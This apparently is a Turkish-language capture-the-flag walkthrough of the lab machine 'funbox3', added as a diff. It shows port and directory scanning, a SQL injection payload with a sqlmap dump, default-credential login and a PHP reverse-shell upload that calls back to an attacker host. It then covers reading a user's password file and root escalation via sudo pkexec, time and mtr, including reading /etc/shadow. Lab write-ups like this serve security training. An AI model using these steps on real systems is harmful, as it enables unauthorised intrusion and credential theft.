@@ -1,0 +1,220 @@
+      ####enumeration
+
+      ####Nmap
+nmapTüm TCP bağlantı noktalarına karşı bir tarama çalıştırarak başlıyoruz :
+kali@kali:~$ sudo nmap -p- $targetip
+Starting Nmap 7.91 ( https://nmap.org ) at 2020-10-29 12:17 EDT
+Nmap scan report for $targetip
+Host is up (0.036s latency).
+Not shown: 65481 closed ports, 51 filtered ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+33060/tcp open  mysqlx
+
+      ####Gobuster
+80 numaralı bağlantı noktasındaki uygulamaya gitmek yararlı bir şey göstermiyor, ancak site dizinlerini kaba kuvvet uygulamak için /usr/share/wordlists/dirb/common.txt gobuster wordlist ile kullanabiliriz:
+kali@kali:~$ gobuster dir -u http://$targetip -w /usr/share/wordlists/dirb/common.txt -z
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+...
+/.htpasswd (Status: 403)
+/.hta (Status: 403)
+/admin (Status: 301)
+/.htaccess (Status: 403)
+/index.html (Status: 200)
+/index.php (Status: 200)
+/robots.txt (Status: 200)
+/secret (Status: 301)
+/server-status (Status: 403)
+/store (Status: 301)
+...
+
+Taramamız birkaç ilgi çekici dizini ortaya koyuyor: /admin (decoy), /secret (decoy) ve /store .
+http://$targetip/admin/ adresine gittiğimizde bir giriş kontrolü görüyoruz. Admin LoginVe http://$targetip/store/ adresine gittiğimizde , ekranın sağ alt kısmında
+http://$targetip/store/admin.php adresinde başka bir oturum açma kontrolüne yönlendiren bir bağlantı görüyoruz .
+
+      ####exploitation
+Bu noktada ilerlemenin birkaç yolu var.
+
+Giriş Yap
+admin:admin Http://$targetip/store/admin.php'ye karşı iyi bilinen varsayılan kimlik bilgisi çiftlerinden birini deneyebiliriz . Ve bu web mağazasının yönetici kullanıcısı olarak giriş yaptığımızı göreceğiz.
+
+SQL Enjeksiyon Güvenlik Açığı
+Alternatif olarak, bu uygulamanın kimliği doğrulanmamış bölümünde bir SQL enjeksiyon güvenlik açığından yararlanabiliriz. Bir kitap resmine tıklayarak (örneğin, ), aşağıdaki gibi GET parametresi C# 6.0 in a Nutshellile sayfasına yönlendiriliyoruz
+:bookisbn
+http://$targetip/store/book.php?bookisbn=978-1-49192-706-9
+SQLi güvenlik açıklarını test etmek için aşağıdaki ' or 1=1; --gibi basit bir yük deneyebiliriz:
+http://$targetip/store/book.php?bookisbn=%27%20or%201=1;%20--
+Ve bu uygulamanın aşağıdaki ayrıntılı hataya dayanarak gerçekten savunmasız göründüğünü görüyoruz:
+Can't retrieve data You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--'' at line 1
+
+      ####SQLMap
+Mağaza için web sitesi dizini uygun bir şekilde isimler store olduğundan, temel alınan veritabanının da adlandırılabileceğine dair bir tahminde bulunabiliriz. Kullanarak sqlmap, istismarı otomatikleştirebilir ve veritabanı içeriğini sızdırabiliriz:
+kali@kali:~$ sqlmap -u http://$targetip/store/book.php?bookisbn= --dump-all --batch -D store
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.4.10#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+...
+
+Database: store                                                                                                          
+Table: admin
+[1 entry]
++-------+--------------------------------------------------+
+| name  | pass                                             |
++-------+--------------------------------------------------+
+| admin | $censoredadminpasswordhash                       (admin) |
++-------+--------------------------------------------------+
+...
+kali@kali:~$ 
+admin:admin Ve bu güvenlik açığı aracılığıyla kullanıcı kimlik bilgilerini elde ettik .
+
+      ####Dosya Yükleme Güvenlik Açığı
+Http://$targetip/store/admin.php adresinde kurtarılan veya tahmin edilen kimlik bilgileriyle admin:admin giriş yaptıktan sonra , http://$targetip/store/admin_book.php adresine yönlendiriliyoruz. Bu sayfa mevcut kitapların bir listesini gösterir.
+Add new book Ayrıca , ekranın sol üst kısmında bizi http://$targetip/store/admin_add.php adresine yönlendiren bir bağlantı görüyoruz . Burada, mağazaya yeni bir dosya yükleyebiliyoruz gibi görünüyor.
+PentestMonkey'den bir PHP ters kabuğu yüklemeyi deneyebiliriz:
+kali@kali:~$ cp /usr/share/webshells/php/php-reverse-shell.php .
+IP adresini ve bağlantı noktasını gerektiği gibi değiştireceğimizden emin olacağız:
+kali@kali:~$ cat php-reverse-shell.php 
+<?php
+// php-reverse-shell - A Reverse Shell implementation in PHP
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+...
+
+$ip = '$attackerip';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
+...
+kali@kali:~$
+Yükleme işleminde bir uyarı vardır: Publishermetin alanı rastgele olamaz ve çeşitli seçeneklerden biri olmalıdır. Bu seçenekleri http://$targetip/store/publisher_list.php sayfasında kolayca görebiliriz:
+kali@kali:~$ curl http://$targetip/store/publisher_list.php
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+...
+<div class="container" id="main">   <p class="lead">List of Publisher</p>
+        <ul>
+                        <li>
+                        <span class="badge">2</span>
+                    <a href="bookPerPub.php?pubid=1">Wrox</a>
+                </li>
+                        <li>
+                        <span class="badge">2</span>
+                    <a href="bookPerPub.php?pubid=2">Wiley</a>
+                </li>
+                        <li>
+                        <span class="badge">3</span>
+                    <a href="bookPerPub.php?pubid=3">O'Reilly Media</a>
+                </li>
+                        <li>
+                        <span class="badge">3</span>
+                    <a href="bookPerPub.php?pubid=4">Apress</a>
+                </li>
+                        <li>
+                        <span class="badge">0</span>
+                    <a href="bookPerPub.php?pubid=5">Packt Publishing</a>
+                </li>
+                        <li>
+                        <span class="badge">1</span>
+                    <a href="bookPerPub.php?pubid=6">Addison-Wesley</a>
+                </li>
+                        <li>
+                        <a href="books.php">List full of books</a>
+                </li>
+        </ul>
+...
+Listelenen seçeneklerden birini Apressve olarak görüyoruz ve bu yayıncı etiketini kullanacağız. Kalan alanlar rastgele veriler içerebilir.
+
+Şimdi http://$targetip/store/admin_book.php'ye dönersek, yeni girişimizin listenin en üstüne eklendiğini göreceğiz:
+ISBN 	Title 	Author 	Image 	Description 	Price 	Publisher 	  	 
+shell 	shell 	hacker 	php-reverse-shell.php 	shell 	10.00 	Apress 	Edit 	Delete
+Ardından, 4444 numaralı bağlantı noktasında bir dinleyici ayarlayacağız ve ardından http://$targetip/store/ adresine giderek ters kabuğu tetikleyeceğiz:
+kali@kali:~$ nc -lvp 4444
+listening on [any] 4444 ...
+192.168.120.224: inverse host lookup failed: Unknown host
+connect to [$attackerip] from (UNKNOWN) [$targetip] 38114
+Linux funbox3 5.4.0-42-generic #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 17:16:51 up  1:03,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$
+Ve user olarak bir ters kabuğumuz var www-data.
+
+      ####Kullanıcı Kimlik Bilgisi Açıklaması
+/home dizinini numaralandırarak ilginç bir /home/tony/password.txt dosyası buluyoruz :
+$ ls -l /home
+total 4
+drwxr-xr-x 2 tony tony 4096 Oct 30 13:11 tony
+$ ls -l /home/tony
+total 4
+-rw-rw-r-- 1 tony tony 70 Jul 31 14:39 password.txt
+$
+Bunun içinde, yanında kullanıcının parolası gibi görünen şeyi buluyoruz ssh:.
+$ cat /home/tony/password.txt
+ssh: $sshpaswordcensored
+gym/admin: $passwordcensored
+/store: admin@admin.com admin
+$
+
+      ####SSH
+Kimlik bilgileriyle hedefe SSH yapmayı deneyebiliriz tony:$tonysshpasswordcensored başarılı oluruz:
+kali@kali:~$ ssh -o StrictHostKeyChecking=no tony@$targetip
+tony@$targetip's password: 
+...
+tony@funbox3:~$ id
+uid=1000(tony) gid=1000(tony) groups=1000(tony),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
+tony@funbox3:~$
+
+      ####Sudo Numaralandırma
+Önce bu kullanıcının yükseltilmiş izinlerle neleri çalıştırabileceğini sıralayacağız ve elimizde bir dizi ikili dosya bulacağız:
+tony@funbox3:~$ sudo -l
+Matching Defaults entries for tony on funbox3:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User tony may run the following commands on funbox3:
+    (root) NOPASSWD: /usr/bin/yelp
+    (root) NOPASSWD: /usr/bin/dmf
+    (root) NOPASSWD: /usr/bin/whois
+    (root) NOPASSWD: /usr/bin/rlogin
+    (root) NOPASSWD: /usr/bin/pkexec
+    (root) NOPASSWD: /usr/bin/mtr
+    (root) NOPASSWD: /usr/bin/finger
+    (root) NOPASSWD: /usr/bin/time
+    (root) NOPASSWD: /usr/bin/cancel
+    (root) NOPASSWD: /root/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/q/r/s/t/u/v/w/x/y/z/.smile.sh
+tony@funbox3:~$
+Özel not, /usr/bin/pkexec , /usr/bin/time ve /usr/bin/mtr ikili dosyalarıdır . Ayrıca, .smile.sh yok ve bu dizinlerin hiçbiri yok.
+
+      ####pkexec aracılığıyla yetki yükseltme (escalation)
+İlk olarak, /usr/bin/pkexec kullanarak root yetkisini aşağıdaki gibi yükseltebiliriz:
+tony@funbox3:~$ whoami
+tony
+tony@funbox3:~$ sudo /usr/bin/pkexec /bin/sh
+# whoami
+root
+#
+
+      ####time üzerinden yetki yükseltme (escalation)
+Alternatif olarak, /usr/bin/time kullanarak root yetkisini aşağıdaki gibi yükseltebiliriz :
+tony@funbox3:~$ whoami
+tony
+tony@funbox3:~$ sudo /usr/bin/time /bin/sh
+# whoami
+root
+#
+
+      ####Sistem Dosyalarını mtr ile Okuma
+Ayrıca, /usr/bin/mtr kullanarak herhangi bir sistem dosyasını (örneğin /etc/shadow ) aşağıdaki gibi okuyabiliyoruz :
+tony@funbox3:~$ whoami
+tony
+tony@funbox3:~$ LFILE=/etc/shadow
+tony@funbox3:~$ sudo /usr/bin/mtr --raw -F "$LFILE"
+ve shadow dosyasındaki bilgilere ulaşabiliyoruz.
